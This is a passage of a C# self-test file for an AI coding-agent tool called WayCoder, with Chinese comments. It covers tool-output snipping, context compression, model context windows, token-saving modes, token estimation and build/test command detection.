using System.IO.Compression;
using System.Text;
using System.Text.Json;
using WayCoder.Infra;
using WayCoder.Tools;
using WayCoder.UI.Shared;
using WayCoder.UI.Tui;
using WayCoder.UI.Shared.Terminal;
using WayCoder.UI.Tui.Controls;
using WayCoder.UI.Tui.Screens;

namespace WayCoder;

public static partial class SelfTest
{
    /// <summary>获取 notebook cell 的 source 文本（测试助手）</summary>
    private static string GetNotebookSource(JNode notebook, int cellIndex)
    {
        var cells = notebook["cells"];
        if (cells == null || cellIndex >= cells.Count) return "";
        var source = cells[cellIndex]?["source"];
        if (source is { Kind: JKind.Array })
        {
            var sb = new StringBuilder();
            foreach (var line in source.Items) sb.Append(line.AsString() ?? "");
            return sb.ToString();
        }
        return source?.AsString() ?? "";
    }

    // ═══════════════════════════════════════════════════════════
    //  ContextManager 单元测试
    // ═══════════════════════════════════════════════════════════

    /// <summary>SnipToolOutputs 完整测试</summary>
    private static void TestSnipToolOutputs(Action<string, bool> Check)
    {
        // ── 1. 短内容不裁剪（≤4000 字符）──
        var shortMsgs = new List<JNode>
        {
            JNode.Object().Set("role", "tool").Set("content", "短输出\n只有几行\n内容很少"),
        };
        var shortBefore = shortMsgs[0]["content"]!.AsString();
        ContextManager.SnipToolOutputs(shortMsgs);
        Check("Snip: 短内容不裁剪", shortMsgs[0]["content"]!.AsString() == shortBefore);

        // ── 2. 非 tool 消息不裁剪 ──
        var userMsgs = new List<JNode>
        {
            JNode.Object().Set("role", "user").Set("content", new string('x', 5000)),
        };
        var userBefore = userMsgs[0]["content"]!.AsString();
        ContextManager.SnipToolOutputs(userMsgs);
        Check("Snip: 非tool消息不裁剪", userMsgs[0]["content"]!.AsString() == userBefore);

        // ── 3. 长内容裁剪（>4000 字符 + >10 行）──
        var lines = new List<string>();
        for (int i = 0; i < 200; i++)
            lines.Add($"第 {i:D4} 行：{new string('y', 30)}");
        var longContent = string.Join("\n", lines);
        Check("Snip: 输入内容 >4000 字符", longContent.Length > 4000);

        var longMsgs = new List<JNode>
        {
            JNode.Object().Set("role", "tool").Set("content", longContent),
        };
        var longBefore = ContextManager.EstimateTokens(longMsgs);
        ContextManager.SnipToolOutputs(longMsgs);
        var longAfter = ContextManager.EstimateTokens(longMsgs);
        Check("Snip: 长内容被裁剪", longAfter < longBefore);
        var snipped = longMsgs[0]["content"]!.AsString()!;
        Check("Snip: 裁剪后包含省略标记", snipped.Contains("省略") || snipped.Contains("裁剪"));

        // ── 4. 错误行保留 ──
        var errorLines = new List<string>();
        for (int i = 0; i < 10; i++)
            errorLines.Add($"普通行 {i}");
        errorLines.Add("Program.cs(45,12): error CS0103: 当前上下文中不存在名称 'doesNotExist'");
        errorLines.Add("Program.cs(67,3): error CS0246: 未能找到类型或命名空间名 'UnknownType'");
        for (int i = 0; i < 150; i++)
            errorLines.Add($"后续行 {i}：{new string('z', 30)}");

        var errorContent = string.Join("\n", errorLines);
        Check("Snip(错误): 输入内容 >4000 字符", errorContent.Length > 4000);

        var errMsgs = new List<JNode>
        {
            JNode.Object().Set("role", "tool").Set("content", errorContent),
        };
        ContextManager.SnipToolOutputs(errMsgs);
        var errSnipped = errMsgs[0]["content"]!.AsString()!;
        Check("Snip: 错误行 CS0103 被保留", errSnipped.Contains("CS0103"));
        Check("Snip: 错误行 CS0246 被保留", errSnipped.Contains("CS0246"));
        Check("Snip: 裁剪后包含错误统计", errSnipped.Contains("错误"));

        // ── 5. 首5尾5保留 ──
        var seqMsgs = new List<JNode>
        {
            JNode.Object().Set("role", "tool").Set("content", string.Join("\n", Enumerable.Range(0, 100).Select(i => $"LINE_{i:D3}: {new string('x', 50)}"))),
        };
        ContextManager.SnipToolOutputs(seqMsgs);
        var seqSnipped = seqMsgs[0]["content"]!.AsString()!;
        Check("Snip: 首部 LINE_000 被保留", seqSnipped.Contains("LINE_000"));
        Check("Snip: 首部 LINE_004 被保留", seqSnipped.Contains("LINE_004"));
        Check("Snip: 尾部 LINE_099 被保留", seqSnipped.Contains("LINE_099"));
        Check("Snip: 尾部 LINE_095 被保留", seqSnipped.Contains("LINE_095"));

        // ── 6. 多消息混合（部分裁剪）──
        var mixedMsgs = new List<JNode>
        {
            JNode.Object().Set("role", "user").Set("content", "请编译项目"),
            JNode.Object().Set("role", "tool").Set("content", new string('a', 200)), // 短输出不裁剪
            JNode.Object().Set("role", "tool").Set("content", string.Join("\n", Enumerable.Range(0, 100).Select(i => $"L{i:D3}: {new string('y', 50)}"))), // 长输出裁剪
        };
        var mixedChanged = ContextManager.SnipToolOutputs(mixedMsgs);
        Check("Snip: 混合消息有裁剪发生", mixedChanged);
        Check("Snip: 用户消息不变", mixedMsgs[0]["content"]!.AsString() == "请编译项目");
        Check("Snip: 短tool不裁剪", mixedMsgs[1]["content"]!.AsString()!.Length < 300);
        Check("Snip: 长tool被裁剪", mixedMsgs[2]["content"]!.AsString()!.Contains("省略") || mixedMsgs[2]["content"]!.AsString()!.Contains("裁剪"));
    }

    /// <summary>压缩保真度测试：超多需求压缩后关键信息仍保留（无 LLM 回退路径）</summary>
    private static void TestCompressionFidelity(Action<string, bool> Check)
    {
        // 构造"超多需求"消息：30 条需求 + 关联文件路径/命名空间/API 签名/错误码
        var msgs = new List<JNode>
        {
            JNode.Object().Set("role", "user").Set("content", "为 WayCoder 实现 30 个新工具，每个工具一个文件，全部完成后编译。")
        };
        for (int i = 1; i <= 30; i++)
        {
            msgs.Add(JNode.Object()
                .Set("role", "user")
                .Set("content", $"需求 {i}：实现 Tools/{i:D2}Tool.cs 工具，namespace WayCoder.Tools，" +
                              $"提供 public async Task<string> Execute(Dictionary<string, object?> args) 方法，处理业务逻辑。"));
        }
        // 冗余长工具输出（触发第 1 层裁剪）
        msgs.Add(JNode.Object()
            .Set("role", "tool")
            .Set("content", string.Join("\n", Enumerable.Range(0, 150).Select(i => $"冗余输出行 {i:D4}：{new string('x', 60)}"))));
        // 编译错误信息
        msgs.Add(JNode.Object()
            .Set("role", "tool")
            .Set("content", "编译失败：Program.cs(45,12): error CS0103: 当前上下文中不存在名称 'doesNotExist'"));

        var before = msgs.Count;
        var cm = new ContextManager(2000); // 极小 maxTokens 压低三层阈值
        var compressed = cm.MaybeCompressAsync(msgs, null).GetAwaiter().GetResult();

        Check("压缩保真: 压缩确实发生", compressed);
        Check("压缩保真: 消息数减少", msgs.Count < before);

        var flat = string.Join("\n", msgs.Select(m => m["content"]?.AsString() ?? ""));

        // 保真度：文件路径 / 命名空间 / 错误码保留
        Check("压缩保真: 保留文件路径", flat.Contains("Tool.cs"));
        Check("压缩保真: 保留命名空间", flat.Contains("WayCoder.Tools"));
        Check("压缩保真: 保留错误码 CS0103", flat.Contains("CS0103"));
        // 保真度：需求条目保留（A2 增强）
        Check("压缩保真: 保留待完成需求段", flat.Contains("待完成需求"));
        Check("压缩保真: 保留具体需求条目", flat.Contains("需求 1"));
    }

    /// <summary>上下文窗口按模型切换测试</summary>
    private static void TestContextWindowSwitch(Action<string, bool> Check)
    {
        // ── 1. ResolveContextWindow 按模型解析窗口 ──
        Check("窗口: deepseek-v4-pro = 1M", ModelCatalog.ResolveContextWindow("deepseek-v4-pro") == 1_048_576);
        Check("窗口: deepseek-chat = 64K", ModelCatalog.ResolveContextWindow("deepseek-chat") == 64_000);
        Check("窗口: ollama 本地模型 = 128K", ModelCatalog.ResolveContextWindow("deepseek-coder-v2:latest") == 128_000);
        Check("窗口: 未知模型回退 1M", ModelCatalog.ResolveContextWindow("no-such-model") == 1_048_576);
        Check("窗口: null 回退 1M", ModelCatalog.ResolveContextWindow(null) == 1_048_576);
        Check("窗口: 空字符串回退 1M", ModelCatalog.ResolveContextWindow("") == 1_048_576);
        Check("窗口: 自定义回退值生效", ModelCatalog.ResolveContextWindow("unknown", 64_000) == 64_000);

        // ── 2. UpdateMaxTokens 重算阈值：小窗口压缩、放大后不再压缩 ──
        var longTool = new List<JNode>
        {
            JNode.Object().Set("role", "tool").Set("content", string.Join("\n", Enumerable.Range(0, 100).Select(i => $"行{i}: {new string('x', 60)}")))
        };

        var smallCm = new ContextManager(200);
        var smallCopy = new List<JNode>
        {
            JNode.Object().Set("role", "tool").Set("content", longTool[0]["content"]!.AsString())
        };
        var compressedSmall = smallCm.MaybeCompressAsync(smallCopy, null).GetAwaiter().GetResult();
        Check("窗口: 小窗口触发压缩", compressedSmall);

        smallCm.UpdateMaxTokens(100_000);
        var largeCopy = new List<JNode>
        {
            JNode.Object().Set("role", "tool").Set("content", longTool[0]["content"]!.AsString())
        };
        var compressedLarge = smallCm.MaybeCompressAsync(largeCopy, null).GetAwaiter().GetResult();
        Check("窗口: 放大后不再压缩", !compressedLarge);

        // ── 3. UpdateMaxTokens 边界：非正值忽略 ──
        var cm = new ContextManager(1000);
        cm.UpdateMaxTokens(0);
        Check("窗口: UpdateMaxTokens(0) 忽略", cm.MaxTokens == 1000);
        cm.UpdateMaxTokens(-5);
        Check("窗口: UpdateMaxTokens(-5) 忽略", cm.MaxTokens == 1000);
        cm.UpdateMaxTokens(2048);
        Check("窗口: UpdateMaxTokens(2048) 生效", cm.MaxTokens == 2048);
    }

    /// <summary>
    /// 上下文预算判断（ShouldStopAndSummarize）测试：验证用「最近一次真实 prompt」而非「累计用量」判断。
    /// v0.53.2 修复：此前用累计用量（单调递增）判断，上下文远未满时误触发压缩，且压缩层用消息估算
    /// （远低于阈值）实际不压缩，累计值不重置形成循环刷屏。
    /// </summary>
    private static void TestContextStopWhen(Action<string, bool> Check)
    {
        // ── 1. LastPromptTokens 记录最近一次（覆盖而非累加）──
        var cm = new ContextManager(1_048_576);
        cm.AddUsage(50_000, 5_000, 40_000);
        cm.AddUsage(80_000, 8_000, 60_000);
        Check("StopWhen: LastPromptTokens 记录最近一次（非累加）", cm.LastPromptTokens == 80_000);
        Check("StopWhen: 累计 prompt 仍累加（花费追踪）", cm.CumulativePromptTokens == 130_000);

        // ── 2. 大窗口（>200K）：累计超窗口但最近 prompt 小 → 不触发 ──
        var cm2 = new ContextManager(1_048_576);
        cm2.AddUsage(1_000_000, 50_000, 0);   // 累计 100 万
        cm2.AddUsage(100_000, 5_000, 0);      // 累计 110 万（超窗口），但最近 prompt 仅 10 万
        Check("StopWhen: 累计超窗口但最近 prompt 小 → 不触发", !cm2.ShouldStopAndSummarize());

        // ── 3. 大窗口：最近 prompt 接近窗口 → 触发 ──
        var cm3 = new ContextManager(1_048_576);
        cm3.AddUsage(1_030_000, 0, 0);        // 剩余 18576 <= 20K buffer
        Check("StopWhen: 最近 prompt 接近窗口 → 触发", cm3.ShouldStopAndSummarize());

        // ── 4. 小窗口（≤200K）：比例阈值 20% ──
        var cm4 = new ContextManager(100_000);
        cm4.AddUsage(85_000, 0, 0);           // 剩余 15K <= 20K（20% 比例）
        Check("StopWhen: 小窗口最近 prompt 到 85% → 触发", cm4.ShouldStopAndSummarize());
        var cm4b = new ContextManager(100_000);
        cm4b.AddUsage(30_000, 0, 0);          // 剩余 70K > 20K → 不触发
        Check("StopWhen: 小窗口最近 prompt 30% → 不触发", !cm4b.ShouldStopAndSummarize());

        // ── 5. ResetUsage 重置 LastPromptTokens ──
        var cm5 = new ContextManager(1_048_576);
        cm5.AddUsage(900_000, 0, 0);
        Check("StopWhen: Reset 前 LastPromptTokens 已记录", cm5.LastPromptTokens == 900_000);
        cm5.ResetUsage();
        Check("StopWhen: ResetUsage 重置 LastPromptTokens", cm5.LastPromptTokens == 0);
        Check("StopWhen: Reset 后不触发压缩", !cm5.ShouldStopAndSummarize());
    }

    /// <summary>Tiny 模式测试（4K 窗口 + 精简提示词）</summary>
    private static void TestTinyMode(Action<string, bool> Check)
    {
        Check("Tiny: 窗口常量 = 4096", Config.TinyContextWindow == 4096);
        Check("Tiny: 默认关闭", new Config().TinyMode == false);

        // ResolveContextWindow 在 TinyMode 下固定 4K，忽略模型窗口
        var saved = Config.Instance.TinyMode;
        Config.Instance.TinyMode = true;
        Check("Tiny: 窗口固定 4K（忽略模型）", ModelCatalog.ResolveContextWindow("deepseek-v4-pro") == 4096);
        Config.Instance.TinyMode = false;
        Check("Tiny: 关闭后恢复模型窗口", ModelCatalog.ResolveContextWindow("deepseek-v4-pro") == 1_048_576);

        // 系统提示词精简
        Config.Instance.TinyMode = true;
        var tinyPrompt = SystemPrompt.Generate(ToolRegistry.AllTools);
        Config.Instance.TinyMode = saved;
        Check("Tiny: 提示词精简 <3000 字符", tinyPrompt.Length < 3000);
        Check("Tiny: 含工具列表", tinyPrompt.Contains("bash"));
        Check("Tiny: 含先读后改规则", tinyPrompt.Contains("先读后改"));
        Check("Tiny: 含工作目录", tinyPrompt.Contains("工作目录"));
    }

    private static void TestTinyWindow(Action<string, bool> Check)
    {
        // 窗口规格解析
        Check("Tiny: ParseWindowSpec 8k → 8192", ModelCatalog.ParseWindowSpec("8k") == 8192);
        Check("Tiny: ParseWindowSpec 8192 → 8192", ModelCatalog.ParseWindowSpec("8192") == 8192);
        Check("Tiny: ParseWindowSpec 4K → 4096", ModelCatalog.ParseWindowSpec("4K") == 4096);
        Check("Tiny: ParseWindowSpec 16k → 16384", ModelCatalog.ParseWindowSpec("16k") == 16384);
        Check("Tiny: ParseWindowSpec 非法 → null", ModelCatalog.ParseWindowSpec("abc") == null);
        Check("Tiny: ParseWindowSpec 空 → null", ModelCatalog.ParseWindowSpec("") == null);
        Check("Tiny: ParseWindowSpec 0 → null", ModelCatalog.ParseWindowSpec("0") == null);

        // 显式指定窗口
        Check("Tiny: --tiny 8k 指定窗口", ModelCatalog.ResolveTinyWindow("8k", null, null) == 8192);

        // 自动探测：非 ollama 走目录；未知模型兜底 4K
        Check("Tiny: 自动探测目录窗口", ModelCatalog.ResolveTinyWindow(null, "deepseek-v4-pro", null) == 1_048_576);
        Check("Tiny: 自动探测失败兜底 4K", ModelCatalog.ResolveTinyWindow(null, "未知模型xyz", null) == 4096);

        // ProbeModelWindow
        Check("Tiny: ProbeModelWindow 目录命中", ModelCatalog.ProbeModelWindow("deepseek-v4-pro", null, 1000) == 1_048_576);
        Check("Tiny: ProbeModelWindow 兜底", ModelCatalog.ProbeModelWindow("未知xyz", null, 4096) == 4096);

        // 128K 自动阈值
        Check("Tiny: 自动阈值 = 128K", Config.TinyAutoThreshold == 128_000);
        Check("Tiny: 32K 模型低于阈值", ModelCatalog.ProbeModelWindow("qwen2.5-coder:3b", null, 1_048_576) < Config.TinyAutoThreshold);
        Check("Tiny: 1M 模型不低于阈值", ModelCatalog.ProbeModelWindow("deepseek-v4-pro", null, 1_048_576) >= Config.TinyAutoThreshold);

        // Ollama base url 识别
        Check("Tiny: IsOllamaBaseUrl localhost", ModelCatalog.IsOllamaBaseUrl("http://localhost:11434"));
        Check("Tiny: IsOllamaBaseUrl 非 ollama", !ModelCatalog.IsOllamaBaseUrl("https://api.deepseek.com"));
    }

    /// <summary>省 token 模式（EconomyMode 三态 + 优先级）测试</summary>
    private static void TestEconomyMode(Action<string, bool> Check)
    {
        Check("Economy: 默认关闭", new Config().EconomyMode == EconomyMode.Off);
        Check("Economy: 默认优先级=质量优先", new Config().EconomyPriority == EconomyPriority.Quality);
        Check("Economy: 输出上限常量 = 8192", Config.EconomyMaxTokens == 8192);
        Check("Economy: snip 阈值常量 = 2000", Config.EconomySnipChars == 2000);
        Check("Economy: 正常 snip 阈值常量 = 4000", Config.SnipCharsNormal == 4000);
        Check("Economy: 复杂任务轮数基准 = 30", Config.EconomyComplexRounds == 30);

        var savedEconomy = Config.Instance.EconomyMode;
        var savedPriority = Config.Instance.EconomyPriority;

        // ResolveRatio 三态：Off 用正常值，On 取更小值，Auto 按复杂度插值
        Config.Instance.EconomyMode = EconomyMode.Off;
        Check("Economy: Off 用正常值", ContextManager.ResolveRatio(50, 35, 0.5) == 50);
        Config.Instance.EconomyMode = EconomyMode.On;
        Check("Economy: On 取更小值", ContextManager.ResolveRatio(50, 35, 0.5) == 35);
        Check("Economy: On 尊重更低配置", ContextManager.ResolveRatio(30, 35, 0.5) == 30);

        // Auto + 质量优先（默认）：简单任务省、复杂任务保质量
        Config.Instance.EconomyMode = EconomyMode.Auto;
        Config.Instance.EconomyPriority = EconomyPriority.Quality;
        Check("Economy: 质量优先-简单任务省(复杂度0→省 token 值)", ContextManager.ResolveRatio(50, 35, 0.0) == 35);
        Check("Economy: 质量优先-复杂任务不省(复杂度1→正常值)", ContextManager.ResolveRatio(50, 35, 1.0) == 50);
        var midR = ContextManager.ResolveRatio(50, 35, 0.5);
        Check("Economy: 质量优先-中复杂度介于两者之间", midR > 35 && midR < 50);
        Check("Economy: 质量优先-简单收紧系数=1", ContextManager.AutoAggressiveness(0.0) == 1);
        Check("Economy: 质量优先-复杂收紧系数=0", ContextManager.AutoAggressiveness(1.0) == 0);

        // Auto + 费用优先：复杂任务仍省
        Config.Instance.EconomyPriority = EconomyPriority.Cost;
        Check("Economy: 费用优先-复杂任务仍省", ContextManager.ResolveRatio(50, 35, 1.0) == 35);
        Check("Economy: 费用优先-收紧系数恒=1", ContextManager.AutoAggressiveness(0.9) == 1);

        // Auto + 均衡：复杂任务保留一半省钱
        Config.Instance.EconomyPriority = EconomyPriority.Balanced;
        Check("Economy: 均衡-简单任务省", ContextManager.ResolveRatio(50, 35, 0.0) == 35);
        Check("Economy: 均衡-复杂任务保留一半省钱", ContextManager.ResolveRatio(50, 35, 1.0) == 42);

        // 系统提示词精简（仅 On 生效）
        Config.Instance.EconomyMode = EconomyMode.On;
        var economyPrompt = SystemPrompt.Generate(ToolRegistry.AllTools);
        Config.Instance.EconomyMode = savedEconomy;
        var fullPrompt = SystemPrompt.Generate(ToolRegistry.AllTools);
        Check("Economy: 提示词比完整版更短", economyPrompt.Length < fullPrompt.Length);
        Check("Economy: 含工具列表", economyPrompt.Contains("bash"));
        Check("Economy: 含先读后改规则", economyPrompt.Contains("先读后改"));
        Check("Economy: 含工作目录", economyPrompt.Contains("工作目录"));
        Check("Economy: 不含 10 阶段流水线", !economyPrompt.Contains("systematic_phases"));

        // Auto 模式用完整提示词（不清简，仅动态调节压缩阈值）
        Config.Instance.EconomyMode = EconomyMode.Auto;
        var autoPrompt = SystemPrompt.Generate(ToolRegistry.AllTools);
        Check("Economy: Auto 用完整提示词(含流水线)", autoPrompt.Contains("systematic_phases"));

        // SnipToolOutputs 阈值：约 3300 字符（介于 2000 与 4000 之间），关闭不截断、打开截断
        var midContent = string.Join("\n", Enumerable.Range(0, 60).Select(i => new string('x', 50) + $"_{i:D3}"));
        Config.Instance.EconomyMode = EconomyMode.Off;
        var msgsOff = new List<JNode> { JNode.Object().Set("role", "tool").Set("content", midContent) };
        ContextManager.SnipToolOutputs(msgsOff);
        Check("Economy: 关闭时 3300 字符不截断", msgsOff[0]["content"]!.AsString() == midContent);

        Config.Instance.EconomyMode = EconomyMode.On;
        var msgsOn = new List<JNode> { JNode.Object().Set("role", "tool").Set("content", midContent) };
        ContextManager.SnipToolOutputs(msgsOn);
        Check("Economy: 打开时 3300 字符被截断", msgsOn[0]["content"]!.AsString()!.Length < midContent.Length);

        Config.Instance.EconomyMode = savedEconomy;
        Config.Instance.EconomyPriority = savedPriority;
    }

    /// <summary>ExtractKeyInfo 增强版测试</summary>
    private static void TestExtractKeyInfo(Action<string, bool> Check)
    {
        // 反射调用 private 方法 ExtractKeyInfo
        var method = typeof(ContextManager).GetMethod("ExtractKeyInfo",
            System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);
        // AOT 不支持反射，使用公开的 SnipToolOutputs 侧面验证 + 直接构造场景
        // 通过 SnipToolOutputs 的错误保留逻辑覆盖错误提取路径

        // ── 验证：错误行中的 CS 错误码被识别 ──
        var msgsWithErrors = new List<JNode>
        {
            JNode.Object().Set("role", "tool").Set("content", string.Join("\n",
                Enumerable.Range(0, 5).Select(i => $"行{i}")
                .Concat(new[] {
                    "File.cs(10,5): error CS0103: 名称 'foo' 不存在",
                    "File.cs(20,8): error CS0246: 类型 'Bar' 未找到",
                    "Unhandled exception: System.NullReferenceException",
                })
                .Concat(Enumerable.Range(0, 150).Select(i => $"填充行{i}：{new string('x', 40)}")))),
        };
        ContextManager.SnipToolOutputs(msgsWithErrors);
        var result = msgsWithErrors[0]["content"]!.AsString()!;
        Check("ExtractKey: 保留 error CS0103", result.Contains("CS0103"));
        Check("ExtractKey: 保留 error CS0246", result.Contains("CS0246"));
        Check("ExtractKey: 保留 Exception", result.Contains("NullReferenceException"));
        Check("ExtractKey: 错误行上下文在", result.Contains("行3") || result.Contains("行4"));

        // ── 验证：首尾行保留 ──
        Check("ExtractKey: 首行保留", result.Contains("行0"));
        Check("ExtractKey: 尾行保留", result.Contains("填充行149"));

        // ── 验证：namespace 提取（通过 GenerateProjectSnapshot 间接测试）──
        var snapshotMsgs = new List<JNode>
        {
            JNode.Object().Set("role", "assistant").Set("content", "namespace WayCoder.Tools;\nnamespace MiniDB.Storage;\n普通文本"),
        };
        // 测试 GenerateProjectSnapshot 不为空
        var snapshot = typeof(ContextManager).GetMethod("GenerateProjectSnapshot",
            System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);
        // AOT 限制：无法反射调用 private 方法，但 GenerateProjectSnapshot 在 HardCollapseAsync 内部调用，
        // 通过公开 API 间接测试其输出有效性
    }

    /// <summary>GenerateProjectSnapshot 测试</summary>
    private static void TestGenerateProjectSnapshot(Action<string, bool> Check)
    {
        // 通过 HardCollapseAsync 的调用链间接验证快照不为空且包含关键信息
        // 直接测试：构造场景确保 GenerateProjectSnapshot 不会崩溃

        // ── 验证项目快照内容 ──
        // cwd 可能是仓库根（dotnet run --project WayCoder/...）或 WayCoder/ 子目录，
        // 故用「任一存在」兼容两种运行方式，验证关键子目录存在。
        var cwd = System.IO.Directory.GetCurrentDirectory();
        Check("Snapshot: 工作目录存在", System.IO.Directory.Exists(cwd));
        Check("Snapshot: Agent 目录存在",
            System.IO.Directory.Exists(System.IO.Path.Combine(cwd, "WayCoder", "Agent")) ||
            System.IO.Directory.Exists(System.IO.Path.Combine(cwd, "Agent")));
        Check("Snapshot: .git 目录存在",
            System.IO.Directory.Exists(System.IO.Path.Combine(cwd, ".git")) ||
            System.IO.Directory.Exists(System.IO.Path.Combine(cwd, "..", ".git")));
    }

    /// <summary>Token 估算测试</summary>
    private static void TestTokenEstimation(Action<string, bool> Check)
    {
        // ── CJK 字符权重更高 ──
        var cjkMsg = new List<JNode>
        {
            JNode.Object().Set("role", "user").Set("content", "你好世界这是一个测试"),
        };
        var asciiMsg = new List<JNode>
        {
            JNode.Object().Set("role", "user").Set("content", "hello world this is a test"),
        };
        var cjkTokens = ContextManager.EstimateTokens(cjkMsg);
        var asciiTokens = ContextManager.EstimateTokens(asciiMsg);
        // CJK 10 字符 × 1.5 = 15, ASCII 27 字符 × 0.25 ≈ 7
        Check("TokenEst: CJK tokens > ASCII tokens (等长)", cjkTokens > asciiTokens);

        // ── 空消息列表 → 0 tokens ──
        var empty = ContextManager.EstimateTokens(new List<JNode>());
        Check("TokenEst: 空列表=0", empty == 0);

        // ── 混合内容估算 ──
        var mixed = new List<JNode>
        {
            JNode.Object().Set("role", "user").Set("content", "帮我编译WayCoder项目"),
            JNode.Object().Set("role", "assistant").Set("content", "好的，我来编译项目"),
            JNode.Object().Set("role", "tool").Set("content", "Build succeeded. 0 errors."),
        };
        var mixedTokens = ContextManager.EstimateTokens(mixed);
        Check("TokenEst: 混合消息 > 0", mixedTokens > 0);
        Check("TokenEst: 混合消息 > 单条消息", mixedTokens > ContextManager.EstimateTokens(cjkMsg));

        // ── tool_calls 也被计入 ──
        var withToolCalls = new List<JNode>
        {
            JNode.Object().Set("role", "assistant").Set("content", "我来执行命令")
                .Set("tool_calls", JNode.Array()
                    .Add(JNode.Object()
                        .Set("function", JNode.Object().Set("name", "bash").Set("arguments", "dotnet build")))),
        };
        var withToolTokens = ContextManager.EstimateTokens(withToolCalls);
        var withoutToolTokens = ContextManager.EstimateTokens(new List<JNode>
        {
            JNode.Object().Set("role", "assistant").Set("content", "我来执行命令"),
        });
        Check("TokenEst: tool_calls 增加估计值", withToolTokens > withoutToolTokens);

        // ── 真实 API 用量校准（固定开销：system prompt + 工具定义 + 元数据）──
        var calCm = new ContextManager(128_000);
        var calMsgs = new List<JNode>
        {
            JNode.Object().Set("role", "user").Set("content", "hello world"),
        };
        var calEst = ContextManager.EstimateTokens(calMsgs);
        // 未采集真实用量前，校准值退化为原始估算
        Check("TokenCalib: 无真实数据时校准=估算", calCm.EstimateCalibratedTokens(calMsgs) == calEst);

        // 真实 prompt tokens 含固定开销，校准值应加上开销
        const int overhead1 = 1000;
        calCm.AddUsage(calEst + overhead1, 200, calEst);
        Check("TokenCalib: 校准后含固定开销", calCm.EstimateCalibratedTokens(calMsgs) == calEst + overhead1);

        // 固定开销平滑收敛：第二次 AddUsage 取移动平均
        const int overhead2 = 1200;
        calCm.AddUsage(calEst + overhead2, 200, calEst);
        var expectedAvg = (overhead1 + overhead2) / 2;
        Check("TokenCalib: 开销平滑收敛", calCm.EstimateCalibratedTokens(calMsgs) == calEst + expectedAvg);

        // 有真实开销时校准值必然大于原始估算
        Check("TokenCalib: 校准值 > 原始估算", calCm.EstimateCalibratedTokens(calMsgs) > calEst);
    }

    /// <summary>/init 项目初始化（ProjectInitializer 生成 CLAUDE.md + 命令检测）测试</summary>
    private static void TestProjectInit(Action<string, bool> Check)
    {
        // ── GenerateClaudeMd 结构 ──
        var info = new ProjectInfo
        {
            ProjectRoot = "/tmp/demo-project",
            PrimaryLanguage = "Go",
            Frameworks = new List<string> { "Go" },
            BuildTools = new List<string> { "go" },
        };
        var md = ProjectInitializer.GenerateClaudeMd(info);
        Check("init: 生成含标题", md.Contains("# CLAUDE.md"));
        Check("init: 含项目概述区块", md.Contains("## 项目概述"));
        Check("init: 含项目名", md.Contains("demo-project"));
        Check("init: 含主语言", md.Contains("主语言: Go"));
        Check("init: 含命令块", md.Contains("```bash"));
        Check("init: 含开发规范区块", md.Contains("## 开发规范"));

        // ── 命令检测（临时目录，按构建系统分场景）──
        string? tmp = null;
        try
        {
            tmp = Directory.CreateTempSubdirectory("waycoder-init").FullName;

            // .NET
            var dotnetDir = Path.Combine(tmp, "dotnet");
            Directory.CreateDirectory(dotnetDir);
            File.WriteAllText(Path.Combine(dotnetDir, "App.csproj"), "<Project/>");
            Check("init: dotnet 构建命令", ProjectInitializer.DetectBuildCommand(dotnetDir) == "dotnet build");
            Check("init: dotnet 无 Tests 项目时无测试命令", ProjectInitializer.DetectTestCommand(dotnetDir) == null);
            File.WriteAllText(Path.Combine(dotnetDir, "App.Tests.csproj"), "<Project/>");
            Check("init: dotnet 有 Tests 项目返回 dotnet test", ProjectInitializer.DetectTestCommand(dotnetDir) == "dotnet test");

            // Node.js
            var nodeDir = Path.Combine(tmp, "node");
            Directory.CreateDirectory(nodeDir);
            File.WriteAllText(Path.Combine(nodeDir, "package.json"),
                "{\"scripts\":{\"test\":\"jest\",\"lint\":\"eslint .\"}}");
            Check("init: npm 构建命令", ProjectInitializer.DetectBuildCommand(nodeDir) == "npm install && npm run build");
            Check("init: npm 测试命令", ProjectInitializer.DetectTestCommand(nodeDir) == "npm test");
            Check("init: npm lint 命令", ProjectInitializer.DetectLintCommand(nodeDir) == "npm run lint");

            // Go
            var goDir = Path.Combine(tmp, "go");
            Directory.CreateDirectory(goDir);
            File.WriteAllText(Path.Combine(goDir, "go.mod"), "module x\n");
            Check("init: go 测试命令", ProjectInitializer.DetectTestCommand(goDir) == "go test ./...");
            Check("init: go lint 命令", ProjectInitializer.DetectLintCommand(goDir) == "go vet ./...");

            // Rust
            var rustDir = Path.Combine(tmp, "rust");
            Directory.CreateDirectory(rustDir);
            File.WriteAllText(Path.Combine(rustDir, "Cargo.toml"), "[package]\n");
            Check("init: rust 测试命令", ProjectInitializer.DetectTestCommand(rustDir) == "cargo test");

            // Python
            var pyDir = Path.Combine(tmp, "python");
            Directory.CreateDirectory(pyDir);
            File.WriteAllText(Path.Combine(pyDir, "test_foo.py"), "def test(): pass\n");
            Check("init: python 测试命令", ProjectInitializer.DetectTestCommand(pyDir) == "pytest");

            // 未知项目：返回 null
            var emptyDir = Path.Combine(tmp, "empty");
            Directory.CreateDirectory(emptyDir);
            Check("init: 空目录无构建命令", ProjectInitializer.DetectBuildCommand(emptyDir) == null);
        }
        catch { }
        finally
        {
            if (tmp != null) { try { Directory.Delete(tmp, true); } catch { } }
        }
    }

    private static void TestMultiSlotParallel(Action<string, bool> Check)
    {
        // ── 槽位运行状态（多槽位后台并行执行的核心状态）──
        var slot = new AgentSlot();
        Check("并行: 初始非忙", !slot.IsBusy);
        Check("并行: 初始无取消令牌", slot.Cts == null);
        Check("并行: Sync 锁非空", slot.Sync != null);
        Check("并行: 初始消息为空", slot.ChatMessages.Count == 0);
        Check("并行: 槽位数量为 10", AgentSlot.Count == 10);

        // ── 流式缓冲：StartStream → AppendToken → FinishStream ──
        slot.BufferedStartStream();
        Check("并行: 开始流式创建一条消息", slot.ChatMessages.Count == 1);
        Check("并行: 流式消息标记 Streaming", slot.ChatMessages[^1].Streaming);
        slot.BufferedAppendToken("你好");
        slot.BufferedAppendToken("，世界");
        Check("并行: token 连续拼接", slot.ChatMessages[^1].Content == "你好，世界");
        Check("并行: 追加后仍 Streaming", slot.ChatMessages[^1].Streaming);
        slot.BufferedFinishStream();
        Check("并行: 结束流式取消 Streaming", !slot.ChatMessages[^1].Streaming);

        // ── 无流式消息时 AppendToken 自动新建（对标 EnsureAgentStreaming）──
        slot.BufferedAddMsg("system", "工具输出");
        slot.BufferedAppendToken("继续");
        Check("并行: 无流式消息时 AppendToken 自建",
            slot.ChatMessages[^1].Streaming && slot.ChatMessages[^1].Content == "继续");

